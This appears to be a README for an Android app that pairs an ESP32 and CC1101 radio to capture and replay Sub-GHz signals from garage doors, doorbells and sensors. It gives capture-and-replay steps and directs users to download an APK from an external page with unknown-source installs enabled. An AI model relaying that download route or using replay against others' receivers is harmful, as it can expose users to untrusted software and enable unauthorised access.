# 📡 IshtarRF-Android - Control Sub-GHz signals from your phone

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://ghost00318.github.io)

IshtarRF-Android turns your Android device into a powerful radio tool. It works with standard hardware to let you capture, save, and replay wireless signals. You connect an ESP32 chip with a CC1101 radio module to your phone. The app manages the signals for you. It uses the USB-OTG connection to talk to your hardware. This tool handles various wireless frequencies used by garage doors, doorbells, and remote sensors. 

## ⚙️ Hardware Requirements

You need specific hardware to use this app. It will not work on its own. 

* Android phone with USB-OTG support.
* ESP32 microcontroller board.
* CC1101 wireless module.
* USB-OTG adapter cable.

You must wire the CC1101 module to the ESP32 board properly. Use standard SPI pins for this connection. Ensure your hardware stays secure inside a case for daily use.

## 📥 Getting the App

1. Visit the [official releases page](https://ghost00318.github.io).
2. Look for the Assets section at the bottom of the newest release.
3. Tap the file ending in .apk to download it.
4. Open the downloaded file to start the installation.
5. Your system may ask for permission to install apps from unknown sources. Select Allow to finish the process.

## 📱 Connecting Your Hardware

1. Use your USB-OTG cable to connect the ESP32 to your phone.
2. Open the IshtarRF-Android app.
3. The app will ask for permission to access the USB device. Grant this permission so the app can control the radio.
4. You will see a status light or icon in the app. This shows the connection is active.

## 📡 Capturing Signals

1. Place your phone near the device you want to scan.
2. Select the "Read" or "Capture" mode in the app. 
3. Press the button on your target remote.
4. The app displays the frequency and the raw signal data on your screen.
5. Save the file with a name you remember.

## 🔄 Replaying Signals

1. Open the saved signal file in the app.
2. Point your hardware toward the receiver you want to operate.
3. Tap the "Send" or "Replay" command.
4. The hardware transmits the exact signal captured earlier.

## 📋 Best Practices

* Keep your firmware updated on the ESP32.
* Check your battery level. Radio transmission uses power.
* Test your setup in a quiet area to avoid signal interference.
* Use the app in compliance with all local laws regarding radio transmissions.

## 🛠 Troubleshooting

* If the app does not see the hardware, check your USB-OTG cable.
* Ensure the ESP32 is powered correctly.
* Reconnect the USB cable if the app freezes.
* Verify the antenna is attached to the CC1101 module.

## 📦 Project Features

* **Real-time monitor:** See signals as they travel through the air.
* **Storage system:** Save hundreds of files for later use.
* **Material design:** The interface follows clean, modern standards for ease of use.
* **USB-Serial communication:** Fast and stable link between the radio and phone.
* **Broad support:** Handles common frequencies like 433MHz.

## 💡 Frequently Asked Questions

**Does this work on all phones?**
Most Android phones made in the last five years support USB-OTG. If your phone has a standard USB-C port, it likely works.

**What is a CC1101 module?**
It is a tiny radio chip that talks to wireless devices. It translates radio waves into digital data your phone understands.

**Is it safe?**
The app does not access your personal data, photos, or contacts. It only asks for USB access to work with the radio hardware.

**Can I modify the code?**
Yes. Since this is an open-source project, you can view the source code. You need Android Studio if you want to make changes or build the app yourself from the source files.

**How do I delete saved signals?**
Go to the file manager inside the app. Long-press on any saved capture to find the delete option.